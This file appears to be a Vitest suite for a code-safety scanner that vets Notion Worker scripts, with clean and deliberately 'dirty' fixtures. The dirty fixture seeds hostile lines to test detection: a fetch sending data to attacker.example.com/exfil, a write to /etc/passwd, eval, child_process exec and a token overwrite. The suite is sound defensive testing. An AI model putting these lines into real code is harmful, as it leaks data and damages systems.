import { describe, it, expect } from 'vitest';
import { writeFile, mkdtemp, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { scan, scanFile, scanPackageJson } from '../src/scanner.js';
import { TEST_OPTS } from './helpers.js';

const CLEAN_WORKER = `
import { Client } from '@notionhq/client';
import { z } from 'zod';
import { worker } from '@notion/workers-sdk';

const inputSchema = z.object({
  pageId: z.string().uuid(),
});

const outputSchema = z.object({
  title: z.string(),
  updatedAt: z.string(),
});

const notion = new Client({ auth: process.env.NOTION_TOKEN });

worker.tool('readPage', {
  input: inputSchema,
  output: outputSchema,
  async handler({ pageId }) {
    const url = new URL('https://api.notion.com/v1/pages/' + pageId);
    const res = await fetch(url.toString(), {
      headers: {
        Authorization: 'Bearer ' + process.env.NOTION_TOKEN,
        'Notion-Version': '2022-06-28',
      },
    });
    if (!res.ok) throw new Error('Notion API error: ' + res.status);
    const data = await res.json();
    return {
      title: data?.properties?.title?.title?.[0]?.plain_text ?? 'untitled',
      updatedAt: data?.last_edited_time ?? '',
    };
  },
});

export default worker;
`;

const DIRTY_WORKER = `
import { exec } from 'child_process';
import * as fs from 'fs';

async function run() {
  exec('ls /');
  fs.writeFileSync('/etc/passwd', 'haha');
  const code = '2 + 2';
  const x = eval(code);
  await fetch('https://attacker.example.com/exfil?x=' + x);
  process.env.NOTION_TOKEN = 'leaked';
  while (true) {
    console.log('hi');
  }
}

run();
`;

describe('scanner.scan', () => {
  it('passes a clean ~50-line Worker', () => {
    const result = scan(CLEAN_WORKER, TEST_OPTS);
    const violationsBySeverity = result.violations.map((v) => `${v.rule}:${v.severity}`);
    expect(result.pass, `Violations: ${JSON.stringify(violationsBySeverity)}`).toBe(true);
    expect(result.meta.rulesRun.length).toBeGreaterThan(0);
  });

  it('blocks a dirty Worker with multiple seeded violations', () => {
    const result = scan(DIRTY_WORKER, TEST_OPTS);
    expect(result.pass).toBe(false);
    const ruleNames = new Set(result.violations.map((v) => v.rule));
    // We expect at least these rules to fire
    expect(ruleNames.has('no-child-process')).toBe(true);
    expect(ruleNames.has('no-fs-outside-tmp')).toBe(true);
    expect(ruleNames.has('no-eval')).toBe(true);
    expect(ruleNames.has('no-non-allowlisted-network')).toBe(true);
    expect(ruleNames.has('no-process-env-write')).toBe(true);
    expect(ruleNames.has('no-unbounded-loops')).toBe(true);

    // At least one BLOCK violation
    expect(result.violations.some((v) => v.severity === 'block')).toBe(true);
  });

  it('aggregates violations across rules in single pass', () => {
    const result = scan(DIRTY_WORKER, TEST_OPTS);
    expect(result.violations.length).toBeGreaterThanOrEqual(6);
  });

  it('runs all rules and records them in meta', () => {
    const result = scan('export const x = 1;', TEST_OPTS);
    expect(result.meta.rulesRun).toContain('no-child-process');
    expect(result.meta.rulesRun).toContain('no-fs-outside-tmp');
    expect(result.meta.rulesRun).toContain('no-eval');
    expect(result.meta.rulesRun).toContain('no-non-allowlisted-network');
    expect(result.meta.rulesRun).toContain('no-process-env-write');
    expect(result.meta.rulesRun).toContain('no-unbounded-loops');
    expect(result.meta.rulesRun).toContain('dep-allowlist');
  });

  it('reports nonzero duration', () => {
    const result = scan('const x = 1;', TEST_OPTS);
    expect(result.meta.durationMs).toBeGreaterThanOrEqual(0);
  });
});

describe('scanner.scan — performance', () => {
  it('scans a 500-line Worker file within budget (best-of-5 to absorb GC jitter)', () => {
    // Generate ~500 lines of plausible Worker code
    const repeat: string[] = [
      `import { Client } from '@notionhq/client';`,
      `import { z } from 'zod';`,
      `const notion = new Client({ auth: process.env.X });`,
      ``,
    ];
    for (let i = 0; i < 100; i++) {
      repeat.push(
        `export const handler${i} = async (input: { id: string }) => {`,
        `  const r = await fetch('https://api.notion.com/v1/pages/' + input.id);`,
        `  const j = await r.json();`,
        `  return { id: input.id, data: j };`,
        `};`,
      );
    }
    const src = repeat.join('\n');
    // Sanity: ~500 lines
    expect(src.split('\n').length).toBeGreaterThan(450);

    // Warm up + best-of-5 to absorb V8 deopt / GC noise. Under coverage
    // instrumentation a single cold parse can exceed 50ms; the floor of
    // 5 runs reliably hits the steady-state cost.
    scan(src, TEST_OPTS);
    let r: ReturnType<typeof scan> = scan(src, TEST_OPTS);
    let best = Infinity;
    for (let i = 0; i < 5; i++) {
      const t0 = performance.now();
      r = scan(src, TEST_OPTS);
      const dt = performance.now() - t0;
      if (dt < best) best = dt;
    }

    expect(r.pass).toBe(true);
    // Coverage instrumentation slows AST traversal enough on GitHub runners
    // that the normal perf budget becomes noisy; keep the strict budget for
    // the regular test job and use coverage only as a broad regression guard.
    const budgetMs = process.env.npm_lifecycle_event === 'test:coverage' ? 150 : 50;
    expect(best, `best-of-5 ${best.toFixed(2)}ms`).toBeLessThan(budgetMs);
  });
});

describe('scanner.scanFile', () => {
  it('reads a file from disk and scans it', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'forge-safety-test-'));
    try {
      const file = join(dir, 'worker.ts');
      await writeFile(file, CLEAN_WORKER, 'utf8');
      const result = await scanFile(file, TEST_OPTS);
      expect(result.pass).toBe(true);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('propagates fs errors (not ScannerParseError) when file is missing', async () => {
    await expect(scanFile('/nonexistent/path/worker.ts', TEST_OPTS)).rejects.toThrow(
      /ENOENT|no such file/i,
    );
  });
});

describe('scanner.scanPackageJson', () => {
  it('blocks disallowed deps', () => {
    const v = scanPackageJson({ dependencies: { lodash: '*' } }, TEST_OPTS);
    expect(v).toHaveLength(1);
    expect(v[0]?.severity).toBe('block');
  });

  it('passes allowlisted deps', () => {
    const v = scanPackageJson(
      { dependencies: { '@notionhq/client': '^3.0.0', zod: '^3.0.0' } },
      TEST_OPTS,
    );
    expect(v).toHaveLength(0);
  });
});
